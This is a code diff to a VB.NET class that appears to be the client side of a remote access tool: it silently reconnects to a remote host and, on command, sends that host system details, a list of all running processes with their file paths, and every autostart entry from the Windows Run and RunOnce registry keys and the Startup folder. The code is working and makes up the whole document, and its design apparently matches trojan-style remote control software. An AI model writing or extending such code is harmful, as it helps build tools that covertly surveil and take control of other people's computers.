@@ -1,4 +1,6 @@
-﻿Imports System.Net.Sockets, System.Threading
+﻿Imports System.Net.Sockets
+Imports Microsoft.Win32
+
 Public Class Main
 
 
@@ -32,7 +34,7 @@ e:      ' clear things and ReConnect
             lp = 0
             C.Client.Connect(H, P)
             CN = True
-            Send("Details" + SPL + ID.Getsystem)
+            Send("SysInfo" + SPL + ID.Getsystem)
         Catch ex As Exception
         End Try
         GoTo re
@@ -90,20 +92,158 @@ cc:
         End Try
     End Sub
 
-
-
     Public Shared Sub Data(ByVal b As Byte())
         Dim A As String() = Split(BS(b), SPL)
 
         Try
 
             Select Case A(0)
+
+                Case "Sysinfo"
+                    Send("SysInfo" + SPL + ID.Getsystem)
+
+                Case "PROC"
+                    Dim PR As String = String.Empty
+                    Dim PR_LIST As Process() = Process.GetProcesses()
+                    For Each P As Process In PR_LIST
+                        Try : PR += P.ProcessName & "|'P'|" & P.Id & "|'P'|" & P.MainModule.FileName & "|'P'|" : Catch : End Try ' file |'p'| 1 |'p'| c:/file.exe |'p'|
+                    Next
+                    Send("PROC" + SPL + PR + SPL + Windows.Forms.Application.ExecutablePath)
+
+                Case "STUP" 'credit ĦΔĆҜƗŇǤ ŞØØƒ
+
+                    'HKEY_CURRENT_USER_Run
+                    Dim MyKey1 As String = "Software\Microsoft\Windows\CurrentVersion\Run\"
+                    Dim HKEY_CURRENT_USER_Run As String = String.Empty
+                    If Registry.CurrentUser.OpenSubKey(MyKey1) IsNot Nothing Then
+                        For Each Value In Registry.CurrentUser.OpenSubKey(MyKey1).GetValueNames
+                            If Registry.CurrentUser.OpenSubKey(MyKey1).GetValueKind(Value) = RegistryValueKind.Binary Then
+                                HKEY_CURRENT_USER_Run += Value + "|'P'|" + Text.Encoding.Default.GetString(CType(Registry.CurrentUser.OpenSubKey(MyKey1).GetValue(Value), Byte())) + "|'P'|"
+                            ElseIf Registry.CurrentUser.OpenSubKey(MyKey1).GetValueKind(Value) = RegistryValueKind.MultiString Then
+                                For Each X In Registry.CurrentUser.OpenSubKey(MyKey1).GetValue(Value)
+                                    HKEY_CURRENT_USER_Run += X & "," + "|'P'|"
+                                Next
+                            Else
+                                HKEY_CURRENT_USER_Run += Value + "|'P'|" + Registry.CurrentUser.OpenSubKey(MyKey1).GetValue(Value) + "|'P'|"
+                            End If
+                        Next
+                    End If
+
+                    'HKEY_CURRENT_USER - RunOnce
+                    Dim MyKey2 As String = "Software\Microsoft\Windows\CurrentVersion\RunOnce\"
+                    Dim HKEY_CURRENT_USER_RunOnce As String = String.Empty
+                    If Registry.CurrentUser.OpenSubKey(MyKey2) IsNot Nothing Then
+                        For Each Value In Registry.CurrentUser.OpenSubKey(MyKey2).GetValueNames
+                            If Registry.CurrentUser.OpenSubKey(MyKey2).GetValueKind(Value) = RegistryValueKind.Binary Then
+                                HKEY_CURRENT_USER_RunOnce += Value + "|'P'|" + Text.Encoding.Default.GetString(CType(Registry.CurrentUser.OpenSubKey(MyKey2).GetValue(Value), Byte())) + "|'P'|"
+                            ElseIf Registry.CurrentUser.OpenSubKey(MyKey2).GetValueKind(Value) = RegistryValueKind.MultiString Then
+                                For Each X In Registry.CurrentUser.OpenSubKey(MyKey2).GetValue(Value)
+                                    HKEY_CURRENT_USER_RunOnce += X & "," + "|'P'|"
+                                Next
+                            Else
+                                HKEY_CURRENT_USER_RunOnce += Value + "|'P'|" + Registry.CurrentUser.OpenSubKey(MyKey2).GetValue(Value) + "|'P'|"
+                            End If
+                        Next
+                    End If
+
+                    'HKEY_CURRENT_USER - Policies\Explorer\Run\
+                    Dim MyKey3 = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"
+                    Dim HKEY_CURRENT_USER_Policies As String = String.Empty
+                    If Registry.CurrentUser.OpenSubKey(MyKey3) IsNot Nothing Then
+                        For Each Value In Registry.CurrentUser.OpenSubKey(MyKey3).GetValueNames
+                            If Registry.CurrentUser.OpenSubKey(MyKey3).GetValueKind(Value) = RegistryValueKind.Binary Then
+                                HKEY_CURRENT_USER_Policies += Value + "|'P'|" + Text.Encoding.Default.GetString(CType(Registry.CurrentUser.OpenSubKey(MyKey3).GetValue(Value), Byte())) + "|'P'|"
+                            ElseIf Registry.CurrentUser.OpenSubKey(MyKey3).GetValueKind(Value) = RegistryValueKind.MultiString Then
+                                For Each X In Registry.CurrentUser.OpenSubKey(MyKey3).GetValue(Value)
+                                    HKEY_CURRENT_USER_Policies += X & "," + "|'P'|"
+                                Next
+                            Else
+                                HKEY_CURRENT_USER_Policies += Value + "|'P'|" + Registry.CurrentUser.OpenSubKey(MyKey3).GetValue(Value) + "|'P'|"
+                            End If
+                        Next
+                    End If
+
+                    'LOCAL_MACHINE - Run
+                    Dim MyKey4 = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
+                    Dim LOCAL_MACHINE_Run As String = String.Empty
+
+                    If Registry.LocalMachine.OpenSubKey(MyKey4) IsNot Nothing Then
+                        For Each Value In Registry.LocalMachine.OpenSubKey(MyKey4).GetValueNames
+                            If Registry.LocalMachine.OpenSubKey(MyKey4).GetValueKind(Value) = RegistryValueKind.Binary Then
+                                LOCAL_MACHINE_Run += Value + "|'P'|" + Text.Encoding.Default.GetString(CType(Registry.LocalMachine.OpenSubKey(MyKey4).GetValue(Value), Byte())) + "|'P'|"
+                            ElseIf Registry.LocalMachine.OpenSubKey(MyKey4).GetValueKind(Value) = RegistryValueKind.MultiString Then
+                                For Each X In Registry.LocalMachine.OpenSubKey(MyKey4).GetValue(Value)
+                                    LOCAL_MACHINE_Run += X & "," + "|'P'|"
+                                Next
+                            Else
+                                LOCAL_MACHINE_Run += Value + "|'P'|" + Registry.LocalMachine.OpenSubKey(MyKey4).GetValue(Value) + "|'P'|"
+                            End If
+                        Next
+                    End If
+
+                    'LOCAL_MACHINE - WOW6432Node
+                    Dim MyKey7 = "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
+                    Dim LOCAL_MACHINE_WOW6432Node As String = String.Empty
+
+                    If Registry.LocalMachine.OpenSubKey(MyKey7) IsNot Nothing Then
+                        For Each Value In Registry.LocalMachine.OpenSubKey(MyKey7).GetValueNames
+                            If Registry.LocalMachine.OpenSubKey(MyKey7).GetValueKind(Value) = RegistryValueKind.Binary Then
+                                LOCAL_MACHINE_WOW6432Node += Value + "|'P'|" + Text.Encoding.Default.GetString(CType(Registry.LocalMachine.OpenSubKey(MyKey7).GetValue(Value), Byte())) + "|'P'|"
+                            ElseIf Registry.LocalMachine.OpenSubKey(MyKey7).GetValueKind(Value) = RegistryValueKind.MultiString Then
+                                For Each X In Registry.LocalMachine.OpenSubKey(MyKey7).GetValue(Value)
+                                    LOCAL_MACHINE_WOW6432Node += X & "," + "|'P'|"
+                                Next
+                            Else
+                                LOCAL_MACHINE_WOW6432Node += Value + "|'P'|" + Registry.LocalMachine.OpenSubKey(MyKey7).GetValue(Value) + "|'P'|"
+                            End If
+                        Next
+                    End If
+
+                    'LOCAL_MACHINE - Policies\Explorer\
+                    Dim MyKey5 = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"
+                    Dim LOCAL_MACHINE_Policies As String = String.Empty
+                    If Registry.LocalMachine.OpenSubKey(MyKey5) IsNot Nothing Then
+                        For Each Value In Registry.LocalMachine.OpenSubKey(MyKey5).GetValueNames
+                            If Registry.LocalMachine.OpenSubKey(MyKey5).GetValueKind(Value) = RegistryValueKind.Binary Then
+                                LOCAL_MACHINE_Policies += Value + "|'P'|" + Text.Encoding.Default.GetString(CType(Registry.LocalMachine.OpenSubKey(MyKey5).GetValue(Value), Byte())) + "|'P'|"
+                            ElseIf Registry.LocalMachine.OpenSubKey(MyKey5).GetValueKind(Value) = RegistryValueKind.MultiString Then
+                                For Each X In Registry.LocalMachine.OpenSubKey(MyKey5).GetValue(Value)
+                                    LOCAL_MACHINE_Policies += X & "," + "|'P'|"
+                                Next
+                            Else
+                                LOCAL_MACHINE_Policies += Value + "|'P'|" + Registry.LocalMachine.OpenSubKey(MyKey5).GetValue(Value) + "|'P'|"
+                            End If
+                        Next
+                    End If
+
+                    'LOCAL_MACHINE - RunOnce
+                    Dim MyKey6 = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\"
+                    Dim LOCAL_MACHINE_RunOnce As String = String.Empty
+                    If Registry.LocalMachine.OpenSubKey(MyKey6) IsNot Nothing Then
+                        For Each Value In Registry.LocalMachine.OpenSubKey(MyKey6).GetValueNames
+                            If Registry.LocalMachine.OpenSubKey(MyKey6).GetValueKind(Value) = RegistryValueKind.Binary Then
+                                LOCAL_MACHINE_RunOnce += Value + "|'P'|" + Text.Encoding.Default.GetString(CType(Registry.LocalMachine.OpenSubKey(MyKey6).GetValue(Value), Byte())) + "|'P'|"
+                            ElseIf Registry.LocalMachine.OpenSubKey(MyKey6).GetValueKind(Value) = RegistryValueKind.MultiString Then
+                                For Each X In Registry.LocalMachine.OpenSubKey(MyKey6).GetValue(Value)
+                                    LOCAL_MACHINE_RunOnce += X & "," + "|'P'|"
+                                Next
+                            Else
+                                LOCAL_MACHINE_RunOnce += Value + "|'P'|" + Registry.LocalMachine.OpenSubKey(MyKey6).GetValue(Value) + "|'P'|"
+                            End If
+                        Next
+                    End If
+
+                    'STARTUP folder
+                    Dim STARTUP As String = String.Empty
+                    For Each F As String In IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup))
+                        STARTUP += IO.Path.GetFileName(F) + "|'P'|" + F + "|'P'|"
+                    Next
+
+                    Send("STUP" + SPL + HKEY_CURRENT_USER_Run + SPL + HKEY_CURRENT_USER_RunOnce + SPL + HKEY_CURRENT_USER_Policies + SPL + LOCAL_MACHINE_Run + SPL + LOCAL_MACHINE_Policies + SPL + LOCAL_MACHINE_RunOnce + SPL + STARTUP + SPL + LOCAL_MACHINE_WOW6432Node)
+
+
                 Case "Close"
-                    Try
-                        C.Close()
-                        C = Nothing
-                    Catch ex As Exception
-                    End Try
+                    CloseMe()
             End Select
 
         Catch ex As Exception
@@ -160,7 +300,7 @@ cc:
     Public Shared _H
     Public Shared _P
     Public Shared SPL As String = "|'L'|"
-    Public Shared M As New IO.MemoryStream ' create memory stream
+    Public Shared M As New IO.MemoryStream
 
 
 End Class
